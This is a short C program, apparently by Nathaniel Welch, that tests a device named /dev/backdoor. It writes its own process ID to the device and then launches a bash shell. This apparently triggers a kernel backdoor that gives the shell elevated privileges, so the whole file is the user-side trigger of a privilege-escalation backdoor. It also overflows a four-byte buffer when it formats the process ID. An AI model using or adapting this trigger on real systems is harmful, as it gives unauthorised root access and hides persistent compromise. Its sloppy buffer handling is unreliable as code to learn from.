/**
 * A program to test /dev/backdoor
 * @author Nathaniel "Nat" Welch
 */

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main()
{
	int fd = 0;
	char * printme = NULL;

	printme = (char*)malloc(sizeof(char)*4);

	if((fd = open("/dev/backdoor", 0 | O_WRONLY)) > 0)
	{
		sprintf(printme,"%d",getpid());

		if(write(fd,printme,4) < 4)
		{
			perror("/dev/backdoor");
			exit(EXIT_FAILURE);
		}

		close(fd);

		//exec here... maybe fork too

		execlp("bash","bash",NULL);
	}
	else
	{
		perror("open /dev/backdoor");
		exit(EXIT_FAILURE);
	}

	return 0;

}
